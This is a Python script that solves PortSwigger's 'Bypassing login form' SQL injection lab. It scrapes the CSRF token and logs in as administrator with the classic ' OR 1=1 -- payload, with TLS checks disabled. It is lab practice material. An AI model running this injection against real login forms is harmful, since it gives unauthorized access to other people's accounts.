import requests
import urllib3
import os
import sys
import argparse
from bs4 import BeautifulSoup

# Disable SSL/TLS warnings to keep the terminal clean when using
# interception proxies like Burp Suite.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional Proxy Configuration:
# Uncomment PROXIES and add 'proxies=PROXIES' to requests.get to intercept
# traffic for further manual analysis.
# PROXIES = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


def get_csrf(url, s):  # Extract the CSRF token from the GET /login response..
    r = s.get(url=url, verify=False)  # To use Burp Suite or a similar proxy, include the 'proxies=proxies' parameter.

    soup = BeautifulSoup(r.text, 'html.parser')  # Convert raw HTML response into a searchable BeautifulSoup object

    token_csrf = soup.find('input', {'name':'csrf'})['value']

    if token_csrf:
        print(f'[+] Successfully retrieved the "csrf" token.')
        return token_csrf
    else:
        print(f'[-] Failed to retrieve the token.')
        sys.exit(1)

def exploit(url, csrf, s):
    r = s.post(url=url, data={'csrf':csrf, 'username':'administrator', 'password':"' OR 1=1 --"}, verify=False) # To use Burp Suite or a similar proxy, include the , proxies=proxies parameter.

    soup = BeautifulSoup(r.text, 'html.parser')

    container = soup.find('div', id='account-content')

    if container:
        paragraph = container.find('p')

        if paragraph:
            message = paragraph.get_text(strip=True)
            print('[INFO] Message found:', message)
            
            if 'administrator' in message:
                print('[+] SUCCESS! The exploit was successful, and the lab has been solved.')
            else:
                print('[-] Error: The exploit failed to retrieve the data.')
        else:
            print('[-] No paragraph found inside the container.')
            sys.exit(2)
    else:
        print('[-] Container with \'id=account-content\' not found')
        sys.exit(3)

def main(url):
    complete_url = url + '/login'  # Complete the target URL

    # Using requests.Session() to maintain a persistent state. 
    # This is required to capture the CSRF token from the login page 
    # and include it in the subsequent POST request to bypass security checks.
    s = requests.Session()

    csrf_token = get_csrf(complete_url, s)

    if csrf_token:
        print('[INFO] Executing exploit...')
        exploit(complete_url, csrf_token, s)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Python exploit for PortSwigger\'s SQLi lab: Bypassing login form.')

    parser.add_argument('-t', '--target', required=True,
                        help='Target Domain | Example: https://example.com')
    
    args = parser.parse_args()
    
    main(args.target)